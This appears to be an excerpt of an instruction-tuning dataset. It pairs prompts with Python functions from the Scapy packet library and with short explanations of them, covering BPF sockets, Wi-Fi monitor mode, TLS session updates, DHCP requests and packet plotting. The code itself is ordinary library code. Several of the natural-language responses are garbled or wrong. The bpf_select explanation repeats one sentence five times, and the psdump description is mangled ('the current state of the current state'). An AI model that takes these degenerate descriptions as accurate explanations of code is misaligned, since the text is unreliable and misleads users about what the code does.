{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a dictionary containing a summary of the Dot11 - related elements fields containing the Dot11 - related information.", "response": "def network_stats(self):\n        \"\"\"Return a dictionary containing a summary of the Dot11\n        elements fields\n        \"\"\"\n        summary = {}\n        crypto = set()\n        akmsuite_types = {\n            0x00: \"Reserved\",\n            0x01: \"802.1X\",\n            0x02: \"PSK\"\n        }\n        p = self.payload\n        while isinstance(p, Dot11Elt):\n            if p.ID == 0:\n                summary[\"ssid\"] = plain_str(p.info)\n            elif p.ID == 3:\n                summary[\"channel\"] = ord(p.info)\n            elif isinstance(p, Dot11EltCountry):\n                summary[\"country\"] = plain_str(p.country_string[:2])\n                country_descriptor_types = {\n                    b\"I\": \"Indoor\",\n                    b\"O\": \"Outdoor\",\n                    b\"X\": \"Non-country\",\n                    b\"\\xff\": \"Ignored\"\n                }\n                summary[\"country_desc_type\"] = country_descriptor_types.get(\n                    p.country_string[-1:]\n                )\n            elif isinstance(p, Dot11EltRates):\n                summary[\"rates\"] = p.rates\n            elif isinstance(p, Dot11EltRSN):\n                if p.akm_suites:\n                    auth = akmsuite_types.get(p.akm_suites[0].suite)\n                    crypto.add(\"WPA2/%s\" % auth)\n                else:\n                    crypto.add(\"WPA2\")\n            elif p.ID == 221:\n                if isinstance(p, Dot11EltMicrosoftWPA) or \\\n                        p.info.startswith(b'\\x00P\\xf2\\x01\\x01\\x00'):\n                    if p.akm_suites:\n                        auth = akmsuite_types.get(p.akm_suites[0].suite)\n                        crypto.add(\"WPA/%s\" % auth)\n                    else:\n                        crypto.add(\"WPA\")\n            p = p.payload\n        if not crypto:\n            if self.cap.privacy:\n                crypto.add(\"WEP\")\n            else:\n                crypto.add(\"OPN\")\n        summary[\"crypto\"] = crypto\n        return summary"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_alias_address(iface_name, ip_mask, gw_str, metric):\n\n    # Detect the architecture\n    if scapy.consts.IS_64BITS:\n        offset, name_len = 16, 40\n    else:\n        offset, name_len = 32, 32\n\n    # Retrieve interfaces structures\n    sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    names = array.array('B', b'\\0' * 4096)\n    ifreq = ioctl(sck.fileno(), SIOCGIFCONF,\n                  struct.pack(\"iL\", len(names), names.buffer_info()[0]))\n\n    # Extract interfaces names\n    out = struct.unpack(\"iL\", ifreq)[0]\n    names = names.tobytes() if six.PY3 else names.tostring()\n    names = [names[i:i + offset].split(b'\\0', 1)[0] for i in range(0, out, name_len)]  # noqa: E501\n\n    # Look for the IP address\n    for ifname in names:\n        # Only look for a matching interface name\n        if not ifname.decode(\"utf8\").startswith(iface_name):\n            continue\n\n        # Retrieve and convert addresses\n        ifreq = ioctl(sck, SIOCGIFADDR, struct.pack(\"16s16x\", ifname))\n        ifaddr = struct.unpack(\">I\", ifreq[20:24])[0]\n        ifreq = ioctl(sck, SIOCGIFNETMASK, struct.pack(\"16s16x\", ifname))\n        msk = struct.unpack(\">I\", ifreq[20:24])[0]\n\n        # Get the full interface name\n        ifname = plain_str(ifname)\n        if ':' in ifname:\n            ifname = ifname[:ifname.index(':')]\n        else:\n            continue\n\n        # Check if the source address is included in the network\n        if (ifaddr & msk) == ip_mask:\n            sck.close()\n            return (ifaddr & msk, msk, gw_str, ifname,\n                    scapy.utils.ltoa(ifaddr), metric)\n\n    sck.close()\n    return", "response": "Get the correct source IP address of an interface alias"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef in6_getifaddr():\n    ret = []\n    try:\n        fdesc = open(\"/proc/net/if_inet6\", \"rb\")\n    except IOError:\n        return ret\n    for line in fdesc:\n        # addr, index, plen, scope, flags, ifname\n        tmp = plain_str(line).split()\n        addr = scapy.utils6.in6_ptop(\n            b':'.join(\n                struct.unpack('4s4s4s4s4s4s4s4s', tmp[0].encode())\n            ).decode()\n        )\n        # (addr, scope, iface)\n        ret.append((addr, int(tmp[3], 16), tmp[5]))\n    fdesc.close()\n    return ret", "response": "Returns a list of 3 - tuples of the form addr scope iface"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_iface_mode(iface):\n    p = subprocess.Popen([\"iwconfig\", iface], stdout=subprocess.PIPE,\n                         stderr=subprocess.STDOUT)\n    output, err = p.communicate()\n    match = re.search(br\"mode:([a-zA-Z]*)\", output.lower())\n    if match:\n        return plain_str(match.group(1))\n    return \"unknown\"", "response": "Get the interface mode."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets the monitor mode of an interface.", "response": "def set_iface_monitor(iface, monitor):\n    \"\"\"Sets the monitor mode (or remove it) from an interface.\n    params:\n     - iface: the iwconfig interface\n     - monitor: True if the interface should be set in monitor mode,\n                False if it should be in managed mode\n    \"\"\"\n    mode = get_iface_mode(iface)\n    if mode == \"unknown\":\n        warning(\"Could not parse iwconfig !\")\n    current_monitor = mode == \"monitor\"\n    if monitor == current_monitor:\n        # Already correct\n        return True\n    s_mode = \"monitor\" if monitor else \"managed\"\n\n    def _check_call(commands):\n        p = subprocess.Popen(commands,\n                             stderr=subprocess.PIPE,\n                             stdout=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n        if p.returncode != 0:\n            warning(\"%s failed !\" % \" \".join(commands))\n            return False\n        return True\n    try:\n        assert _check_call([\"ifconfig\", iface, \"down\"])\n        assert _check_call([\"iwconfig\", iface, \"mode\", s_mode])\n        assert _check_call([\"ifconfig\", iface, \"up\"])\n        return True\n    except AssertionError:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef recv_raw(self, x=MTU):\n        pkt, sa_ll = self.ins.recvfrom(x)\n        if self.outs and sa_ll[2] == socket.PACKET_OUTGOING:\n            return None, None, None\n        ts = get_last_packet_timestamp(self.ins)\n        return self.LL, pkt, ts", "response": "Receives a packet then returns a tuple containing the class and the packet data and the time."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns True is obj is a BPF Super Socket", "response": "def isBPFSocket(obj):\n    \"\"\"Return True is obj is a BPF Super Socket\"\"\"\n    return isinstance(obj, L2bpfListenSocket) or isinstance(obj, L2bpfListenSocket) or isinstance(obj, L3bpfSocket)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef bpf_select(fds_list, timeout=None):\n\n    # Check file descriptors types\n    bpf_scks_buffered = list()\n    select_fds = list()\n\n    for tmp_fd in fds_list:\n\n        # Specific BPF sockets: get buffers status\n        if isBPFSocket(tmp_fd) and tmp_fd.buffered_frames():\n            bpf_scks_buffered.append(tmp_fd)\n            continue\n\n        # Regular file descriptors or empty BPF buffer\n        select_fds.append(tmp_fd)\n\n    if select_fds:\n        # Call select for sockets with empty buffers\n        if timeout is None:\n            timeout = 0.05\n        ready_list, _, _ = select(select_fds, [], [], timeout)\n        return bpf_scks_buffered + ready_list\n    else:\n        return bpf_scks_buffered", "response": "A call to recv can return several frames. This function returns several frames. This function returns several frames. This function returns several frames. This function returns several frames. This function returns several frames."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nset the interface in promiscuous mode", "response": "def set_promisc(self, value):\n        \"\"\"Set the interface in promiscuous mode\"\"\"\n\n        try:\n            fcntl.ioctl(self.ins, BIOCPROMISC, struct.pack('i', value))\n        except IOError:\n            raise Scapy_Exception(\"Cannot set promiscuous mode on interface \"\n                                  \"(%s)!\" % self.iface)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nguess the packet class that must be used on the interface", "response": "def guess_cls(self):\n        \"\"\"Guess the packet class that must be used on the interface\"\"\"\n\n        # Get the data link type\n        try:\n            ret = fcntl.ioctl(self.ins, BIOCGDLT, struct.pack('I', 0))\n            ret = struct.unpack('I', ret)[0]\n        except IOError:\n            cls = conf.default_l2\n            warning(\"BIOCGDLT failed: unable to guess type. Using %s !\",\n                    cls.name)\n            return cls\n\n        # Retrieve the corresponding class\n        try:\n            return conf.l2types[ret]\n        except KeyError:\n            cls = conf.default_l2\n            warning(\"Unable to guess type (type %i). Using %s\", ret, cls.name)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nset the non blocking flag on the socket", "response": "def set_nonblock(self, set_flag=True):\n        \"\"\"Set the non blocking flag on the socket\"\"\"\n\n        # Get the current flags\n        if self.fd_flags is None:\n            try:\n                self.fd_flags = fcntl.fcntl(self.ins, fcntl.F_GETFL)\n            except IOError:\n                warning(\"Cannot get flags on this file descriptor !\")\n                return\n\n        # Set the non blocking flag\n        if set_flag:\n            new_fd_flags = self.fd_flags | os.O_NONBLOCK\n        else:\n            new_fd_flags = self.fd_flags & ~os.O_NONBLOCK\n\n        try:\n            fcntl.fcntl(self.ins, fcntl.F_SETFL, new_fd_flags)\n            self.fd_flags = new_fd_flags\n        except Exception:\n            warning(\"Can't set flags on this file descriptor !\")"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_stats(self):\n\n        try:\n            ret = fcntl.ioctl(self.ins, BIOCGSTATS, struct.pack(\"2I\", 0, 0))\n            return struct.unpack(\"2I\", ret)\n        except IOError:\n            warning(\"Unable to get stats from BPF !\")\n            return (None, None)", "response": "Get received and dropped statistics from the BPF."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the length of the BPF buffer", "response": "def get_blen(self):\n        \"\"\"Get the BPF buffer length\"\"\"\n\n        try:\n            ret = fcntl.ioctl(self.ins, BIOCGBLEN, struct.pack(\"I\", 0))\n            return struct.unpack(\"I\", ret)[0]\n        except IOError:\n            warning(\"Unable to get the BPF buffer length\")\n            return"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nclosing the Super Socket", "response": "def close(self):\n        \"\"\"Close the Super Socket\"\"\"\n\n        if not self.closed and self.ins is not None:\n            os.close(self.ins)\n            self.closed = True\n            self.ins = None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting all frames from the buffer and store them in the received_frames list.", "response": "def extract_frames(self, bpf_buffer):\n        \"\"\"Extract all frames from the buffer and stored them in the received list.\"\"\"  # noqa: E501\n\n        # Ensure that the BPF buffer contains at least the header\n        len_bb = len(bpf_buffer)\n        if len_bb < 20:  # Note: 20 == sizeof(struct bfp_hdr)\n            return\n\n        # Extract useful information from the BPF header\n        if FREEBSD or NETBSD:\n            # struct bpf_xhdr or struct bpf_hdr32\n            bh_tstamp_offset = 16\n        else:\n            # struct bpf_hdr\n            bh_tstamp_offset = 8\n\n        # Parse the BPF header\n        bh_caplen = struct.unpack('I', bpf_buffer[bh_tstamp_offset:bh_tstamp_offset + 4])[0]  # noqa: E501\n        next_offset = bh_tstamp_offset + 4\n        bh_datalen = struct.unpack('I', bpf_buffer[next_offset:next_offset + 4])[0]  # noqa: E501\n        next_offset += 4\n        bh_hdrlen = struct.unpack('H', bpf_buffer[next_offset:next_offset + 2])[0]  # noqa: E501\n        if bh_datalen == 0:\n            return\n\n        # Get and store the Scapy object\n        frame_str = bpf_buffer[bh_hdrlen:bh_hdrlen + bh_caplen]\n        try:\n            pkt = self.guessed_cls(frame_str)\n        except Exception:\n            if conf.debug_dissector:\n                raise\n            pkt = conf.raw_layer(frame_str)\n        self.received_frames.append(pkt)\n\n        # Extract the next frame\n        end = self.bpf_align(bh_hdrlen, bh_caplen)\n        if (len_bb - end) >= 20:\n            self.extract_frames(bpf_buffer[end:])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreceiving a single frame from the network", "response": "def recv(self, x=BPF_BUFFER_LENGTH):\n        \"\"\"Receive a frame from the network\"\"\"\n\n        if self.buffered_frames():\n            # Get a frame from the buffer\n            return self.get_frame()\n\n        # Get data from BPF\n        try:\n            bpf_buffer = os.read(self.ins, x)\n        except EnvironmentError as exc:\n            if exc.errno != errno.EAGAIN:\n                warning(\"BPF recv()\", exc_info=True)\n            return\n\n        # Extract all frames from the BPF buffer\n        self.extract_frames(bpf_buffer)\n        return self.get_frame()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting a frame or packet from the received list", "response": "def get_frame(self):\n        \"\"\"Get a frame or packet from the received list\"\"\"\n        pkt = super(L3bpfSocket, self).get_frame()\n        if pkt is not None:\n            return pkt.payload"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsend a packet to the BPF", "response": "def send(self, pkt):\n        \"\"\"Send a packet\"\"\"\n\n        # Use the routing table to find the output interface\n        iff = pkt.route()[0]\n        if iff is None:\n            iff = conf.iface\n\n        # Assign the network interface to the BPF handle\n        if self.assigned_interface != iff:\n            try:\n                fcntl.ioctl(self.outs, BIOCSETIF, struct.pack(\"16s16x\", iff.encode()))  # noqa: E501\n            except IOError:\n                raise Scapy_Exception(\"BIOCSETIF failed on %s\" % iff)\n            self.assigned_interface = iff\n\n        # Build the frame\n        frame = raw(self.guessed_cls() / pkt)\n        pkt.sent_time = time.time()\n\n        # Send the frame\n        L2bpfSocket.send(self, frame)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef tls_session_update(self, msg_str):\n        self.tls_session.handshake_messages.append(msg_str)\n        self.tls_session.handshake_messages_parsed.append(self)", "response": "Add a message to the list of TLS session messages."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef tls_session_update(self, msg_str):\n        super(SSLv2ServerHello, self).tls_session_update(msg_str)\n\n        s = self.tls_session\n        client_cs = s.sslv2_common_cs\n        css = [cs for cs in client_cs if cs in self.ciphers]\n        s.sslv2_common_cs = css\n        s.sslv2_connection_id = self.connection_id\n        s.tls_version = self.version\n        if self.cert is not None:\n            s.server_certs = [self.cert]", "response": "Update the TLS session with the new message."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate a range object from start stop tuple and or tuple.", "response": "def _get_values(value):\n    \"\"\"Generate a range object from (start, stop[, step]) tuples, or\n    return value.\n\n    \"\"\"\n    if (isinstance(value, tuple) and (2 <= len(value) <= 3) and\n            all(hasattr(i, \"__int__\") for i in value)):\n        # We use values[1] + 1 as stop value for (x)range to maintain\n        # the behavior of using tuples as field `values`\n        return range(*((int(value[0]), int(value[1]) + 1) +\n                       tuple(int(v) for v in value[2:])))\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndumps the current state of the current state of the EPS file.", "response": "def psdump(self, filename=None, **kargs):\n        \"\"\"\n        psdump(filename=None, layer_shift=0, rebuild=1)\n\n        Creates an EPS file describing a packet. If filename is not provided a\n        temporary file is created and gs is called.\n\n        :param filename: the file's filename\n        \"\"\"\n        from scapy.config import conf\n        from scapy.utils import get_temp_file, ContextManagerSubprocess\n        canvas = self.canvas_dump(**kargs)\n        if filename is None:\n            fname = get_temp_file(autoext=kargs.get(\"suffix\", \".eps\"))\n            canvas.writeEPSfile(fname)\n            if WINDOWS and conf.prog.psreader is None:\n                os.startfile(fname)\n            else:\n                with ContextManagerSubprocess(\"psdump()\", conf.prog.psreader):\n                    subprocess.Popen([conf.prog.psreader, fname])\n        else:\n            canvas.writeEPSfile(filename)\n        print()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef pdfdump(self, filename=None, **kargs):\n        from scapy.config import conf\n        from scapy.utils import get_temp_file, ContextManagerSubprocess\n        canvas = self.canvas_dump(**kargs)\n        if filename is None:\n            fname = get_temp_file(autoext=kargs.get(\"suffix\", \".pdf\"))\n            canvas.writePDFfile(fname)\n            if WINDOWS and conf.prog.pdfreader is None:\n                os.startfile(fname)\n            else:\n                with ContextManagerSubprocess(\"pdfdump()\",\n                                              conf.prog.pdfreader):\n                    subprocess.Popen([conf.prog.pdfreader, fname])\n        else:\n            canvas.writePDFfile(filename)\n        print()", "response": "Create a PDF file describing a packet."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nextracts description from README. md for PyPI s usage", "response": "def get_long_description():\n    \"\"\"Extract description from README.md, for PyPI's usage\"\"\"\n    try:\n        fpath = os.path.join(os.path.dirname(__file__), \"README.md\")\n        with io.open(fpath, encoding=\"utf-8\") as f:\n            readme = f.read()\n            desc = readme.partition(\"<!-- start_ppi_description -->\")[2]\n            desc = desc.partition(\"<!-- stop_ppi_description -->\")[0]\n            return desc.strip()\n    except IOError:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks for odd packet length and pad according to Cisco spec.", "response": "def _check_len(self, pkt):\n        \"\"\"Check for odd packet length and pad according to Cisco spec.\n        This padding is only used for checksum computation.  The original\n        packet should not be altered.\"\"\"\n        if len(pkt) % 2:\n            last_chr = pkt[-1]\n            if last_chr <= b'\\x80':\n                return pkt[:-1] + b'\\x00' + last_chr\n            else:\n                return pkt[:-1] + b'\\xff' + chb(orb(last_chr) - 1)\n        else:\n            return pkt"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _legacy_pkcs1_v1_5_encode_md5_sha1(M, emLen):\n    M = bytes_encode(M)\n    md5_hash = hashes.Hash(_get_hash(\"md5\"), backend=default_backend())\n    md5_hash.update(M)\n    sha1_hash = hashes.Hash(_get_hash(\"sha1\"), backend=default_backend())\n    sha1_hash.update(M)\n    H = md5_hash.finalize() + sha1_hash.finalize()\n    if emLen < 36 + 11:\n        warning(\"pkcs_emsa_pkcs1_v1_5_encode: \"\n                \"intended encoded message length too short\")\n        return None\n    PS = b'\\xff' * (emLen - 36 - 3)\n    return b'\\x00' + b'\\x01' + PS + b'\\x00' + H", "response": "Legacy method for PKCS1 v1. 5 encoding with MD5 - SHA1 hash."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsending a DHCP discover request and return the answer", "response": "def dhcp_request(iface=None, **kargs):\n    \"\"\"Send a DHCP discover request and return the answer\"\"\"\n    if conf.checkIPaddr != 0:\n        warning(\"conf.checkIPaddr is not 0, I may not be able to match the answer\")  # noqa: E501\n    if iface is None:\n        iface = conf.iface\n    fam, hw = get_if_raw_hwaddr(iface)\n    return srp1(Ether(dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"0.0.0.0\", dst=\"255.255.255.255\") / UDP(sport=68, dport=67) /  # noqa: E501\n                BOOTP(chaddr=hw) / DHCP(options=[(\"message-type\", \"discover\"), \"end\"]), iface=iface, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef apply_ipython_style(shell):\n    try:\n        from IPython.terminal.prompts import Prompts, Token\n    except Exception:\n        from scapy.error import log_loading\n        log_loading.warning(\n            \"IPython too old. Shell color won't be handled.\"\n        )\n        return\n    from scapy.config import conf\n    scapy_style = {}\n    # Overwrite colors\n    if isinstance(conf.color_theme, NoTheme):\n        shell.colors = 'nocolor'\n    elif isinstance(conf.color_theme, BrightTheme):\n        # lightbg is optimized for light backgrounds\n        shell.colors = 'lightbg'\n    elif isinstance(conf.color_theme, ColorOnBlackTheme):\n        # linux is optimised for dark backgrounds\n        shell.colors = 'linux'\n    else:\n        # default\n        shell.colors = 'neutral'\n    try:\n        get_ipython()\n        # This function actually contains tons of hacks\n        color_magic = shell.magics_manager.magics[\"line\"][\"colors\"]\n        color_magic(shell.colors)\n    except NameError:\n        pass\n    # Prompt Style\n    if isinstance(conf.prompt, Prompts):\n        # Set custom prompt style\n        shell.prompts_class = conf.prompt\n    else:\n        if isinstance(conf.color_theme, (FormatTheme, NoTheme)):\n            # Formatable\n            if isinstance(conf.color_theme, HTMLTheme):\n                prompt = cgi.escape(conf.prompt)\n            elif isinstance(conf.color_theme, LatexTheme):\n                from scapy.utils import tex_escape\n                prompt = tex_escape(conf.prompt)\n            else:\n                prompt = conf.prompt\n            prompt = conf.color_theme.prompt(prompt)\n        else:\n            # Needs to be manually set\n            prompt = str(conf.prompt)\n            scapy_style[Token.Prompt] = Color.ansi_to_pygments(\n                conf.color_theme.style_prompt\n            )\n\n        class ClassicPrompt(Prompts):\n            def in_prompt_tokens(self, cli=None):\n                return [(Token.Prompt, prompt), ]\n\n            def out_prompt_tokens(self):\n                return [(Token.OutPrompt, ''), ]\n        # Apply classic prompt style\n        shell.prompts_class = ClassicPrompt\n        sys.ps1 = prompt\n    # Register scapy color style\n    shell.highlighting_style_overrides = scapy_style\n    # Apply if Live\n    try:\n        get_ipython().refresh_style()\n    except NameError:\n        pass", "response": "Updates the specified IPython console shell with the specified conf. color_theme scapy theme."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _wait_non_ressources(self, callback):\n        self.trigger = threading.Lock()\n        self.was_ended = False\n        self.trigger.acquire()\n        self.trigger.acquire()\n        if not self.was_ended:\n            callback(self)", "response": "This method is used to wait for non -ressources to be released and advertise itself to the SelectableSelector using the callback"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreleasing the lock of the object.", "response": "def call_release(self, arborted=False):\n        \"\"\"DEV: Must be call when the object becomes ready to read.\n           Relesases the lock of _wait_non_ressources\"\"\"\n        self.was_ended = arborted\n        try:\n            self.trigger.release()\n        except (threading.ThreadError, AttributeError):\n            pass"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrelease all locks to kill all threads", "response": "def _release_all(self):\n        \"\"\"Releases all locks to kill all threads\"\"\"\n        for i in self.inputs:\n            i.call_release(True)\n        self.available_lock.release()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _exit_door(self, _input):\n        self.results.append(_input)\n        if self._ended:\n            return\n        self._ended = True\n        self._release_all()", "response": "This function is called when the SelectableObject is ready to be used to exit the door."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nprocesses the select command.", "response": "def process(self):\n        \"\"\"Entry point of SelectableSelector\"\"\"\n        if WINDOWS:\n            select_inputs = []\n            for i in self.inputs:\n                if not isinstance(i, SelectableObject):\n                    warning(\"Unknown ignored object type: %s\", type(i))\n                elif i.__selectable_force_select__:\n                    # Then use select.select\n                    select_inputs.append(i)\n                elif not self.remain and i.check_recv():\n                    self.results.append(i)\n                else:\n                    i.wait_return(self._exit_door)\n            if select_inputs:\n                # Use default select function\n                self.results.extend(select(select_inputs, [], [], self.remain)[0])  # noqa: E501\n            if not self.remain:\n                return self.results\n\n            threading.Thread(target=self._timeout_thread, args=(self.remain,)).start()  # noqa: E501\n            if not self._ended:\n                self.available_lock.acquire()\n            return self.results\n        else:\n            r, _, _ = select(self.inputs, [], [], self.remain)\n            return r"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking that a module has a higher version that minver.", "response": "def _version_checker(module, minver):\n    \"\"\"Checks that module has a higher version that minver.\n\n    params:\n     - module: a module to test\n     - minver: a tuple of versions\n    \"\"\"\n    # We could use LooseVersion, but distutils imports imp which is deprecated\n    version_regexp = r'[a-z]?((?:\\d|\\.)+\\d+)(?:\\.dev[0-9]+)?'\n    version_tags = re.match(version_regexp, module.__version__)\n    if not version_tags:\n        return False\n    version_tags = version_tags.group(1).split(\".\")\n    version_tags = tuple(int(x) for x in version_tags)\n    return version_tags >= minver"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if the cryptography library is present and supports X25519.", "response": "def isCryptographyAdvanced():\n    \"\"\"\n    Check if the cryptography library is present, and if it supports X25519,\n    ChaCha20Poly1305 and such (v2.0 or later).\n    \"\"\"\n    try:\n        from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey  # noqa: E501\n        X25519PrivateKey.generate()\n    except Exception:\n        return False\n    else:\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _prompt_changer(attr, val):\n    try:\n        sys.ps1 = conf.color_theme.prompt(conf.prompt)\n    except Exception:\n        pass\n    try:\n        apply_ipython_style(get_ipython())\n    except NameError:\n        pass", "response": "Change the current prompt theme"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _set_conf_sockets():\n    if conf.use_bpf and not BSD:\n        Interceptor.set_from_hook(conf, \"use_bpf\", False)\n        raise ScapyInvalidPlatformException(\"BSD-like (OSX, *BSD...) only !\")\n    if conf.use_winpcapy and not WINDOWS:\n        Interceptor.set_from_hook(conf, \"use_winpcapy\", False)\n        raise ScapyInvalidPlatformException(\"Windows only !\")\n    # we are already in an Interceptor hook, use Interceptor.set_from_hook\n    if conf.use_pcap or conf.use_dnet or conf.use_winpcapy:\n        try:\n            from scapy.arch.pcapdnet import L2pcapListenSocket, L2pcapSocket, \\\n                L3pcapSocket\n        except ImportError:\n            warning(\"No pcap provider available ! pcap won't be used\")\n            Interceptor.set_from_hook(conf, \"use_winpcapy\", False)\n            Interceptor.set_from_hook(conf, \"use_pcap\", False)\n        else:\n            conf.L3socket = L3pcapSocket\n            conf.L3socket6 = functools.partial(L3pcapSocket, filter=\"ip6\")\n            conf.L2socket = L2pcapSocket\n            conf.L2listen = L2pcapListenSocket\n            return\n    if conf.use_bpf:\n        from scapy.arch.bpf.supersocket import L2bpfListenSocket, \\\n            L2bpfSocket, L3bpfSocket\n        conf.L3socket = L3bpfSocket\n        conf.L3socket6 = functools.partial(L3bpfSocket, filter=\"ip6\")\n        conf.L2socket = L2bpfSocket\n        conf.L2listen = L2bpfListenSocket\n        return\n    if LINUX:\n        from scapy.arch.linux import L3PacketSocket, L2Socket, L2ListenSocket\n        conf.L3socket = L3PacketSocket\n        conf.L3socket6 = functools.partial(L3PacketSocket, filter=\"ip6\")\n        conf.L2socket = L2Socket\n        conf.L2listen = L2ListenSocket\n        return\n    if WINDOWS:\n        from scapy.arch.windows import _NotAvailableSocket\n        from scapy.arch.windows.native import L3WinSocket, L3WinSocket6\n        conf.L3socket = L3WinSocket\n        conf.L3socket6 = L3WinSocket6\n        conf.L2socket = _NotAvailableSocket\n        conf.L2listen = _NotAvailableSocket\n        return\n    from scapy.supersocket import L3RawSocket\n    from scapy.layers.inet6 import L3RawSocket6\n    conf.L3socket = L3RawSocket\n    conf.L3socket6 = L3RawSocket6", "response": "Populate the conf. L2Socket and conf. L3Socket according to the various use_* parameters\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef filter(self, func):\n        return self.__class__([x for x in self.res if func(x)],\n                              name=\"filtered %s\" % self.listname)", "response": "Returns a new packet list filtered by a truth function. This truth\n        function has to take a packet as the only argument and return a boolean value."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef plot(self, f, lfilter=None, plot_xy=False, **kargs):\n\n        # Python 2 backward compatibility\n        f = lambda_tuple_converter(f)\n        lfilter = lambda_tuple_converter(lfilter)\n\n        # Get the list of packets\n        if lfilter is None:\n            lst_pkts = [f(*e) for e in self.res]\n        else:\n            lst_pkts = [f(*e) for e in self.res if lfilter(*e)]\n\n        # Mimic the default gnuplot output\n        if kargs == {}:\n            kargs = MATPLOTLIB_DEFAULT_PLOT_KARGS\n        if plot_xy:\n            lines = plt.plot(*zip(*lst_pkts), **kargs)\n        else:\n            lines = plt.plot(lst_pkts, **kargs)\n\n        # Call show() if matplotlib is not inlined\n        if not MATPLOTLIB_INLINED:\n            plt.show()\n\n        return lines", "response": "Applies a function to each packet to get a value that will be plotted\n        with matplotlib. A list of matplotlib. lines. Line2D is returned."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfunction f applies a function to couples and returns a list of matplotlib. lines. Line2D is returned.", "response": "def diffplot(self, f, delay=1, lfilter=None, **kargs):\n        \"\"\"diffplot(f, delay=1, lfilter=None)\n        Applies a function to couples (l[i],l[i+delay])\n\n        A list of matplotlib.lines.Line2D is returned.\n        \"\"\"\n\n        # Get the list of packets\n        if lfilter is None:\n            lst_pkts = [f(self.res[i], self.res[i + 1])\n                        for i in range(len(self.res) - delay)]\n        else:\n            lst_pkts = [f(self.res[i], self.res[i + 1])\n                        for i in range(len(self.res) - delay)\n                        if lfilter(self.res[i])]\n\n        # Mimic the default gnuplot output\n        if kargs == {}:\n            kargs = MATPLOTLIB_DEFAULT_PLOT_KARGS\n        lines = plt.plot(lst_pkts, **kargs)\n\n        # Call show() if matplotlib is not inlined\n        if not MATPLOTLIB_INLINED:\n            plt.show()\n\n        return lines"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nuse a function that returns a label and a value for this label then a list of matplotlib. lines. Line2D is returned.", "response": "def multiplot(self, f, lfilter=None, plot_xy=False, **kargs):\n        \"\"\"Uses a function that returns a label and a value for this label, then\n        plots all the values label by label.\n\n        A list of matplotlib.lines.Line2D is returned.\n        \"\"\"\n\n        # Python 2 backward compatibility\n        f = lambda_tuple_converter(f)\n        lfilter = lambda_tuple_converter(lfilter)\n\n        # Get the list of packets\n        if lfilter is None:\n            lst_pkts = (f(*e) for e in self.res)\n        else:\n            lst_pkts = (f(*e) for e in self.res if lfilter(*e))\n\n        # Apply the function f to the packets\n        d = {}\n        for k, v in lst_pkts:\n            d.setdefault(k, []).append(v)\n\n        # Mimic the default gnuplot output\n        if not kargs:\n            kargs = MATPLOTLIB_DEFAULT_PLOT_KARGS\n\n        if plot_xy:\n            lines = [plt.plot(*zip(*pl), **dict(kargs, label=k))\n                     for k, pl in six.iteritems(d)]\n        else:\n            lines = [plt.plot(pl, **dict(kargs, label=k))\n                     for k, pl in six.iteritems(d)]\n        plt.legend(loc=\"center right\", bbox_to_anchor=(1.5, 0.5))\n\n        # Call show() if matplotlib is not inlined\n        if not MATPLOTLIB_INLINED:\n            plt.show()\n\n        return lines"}
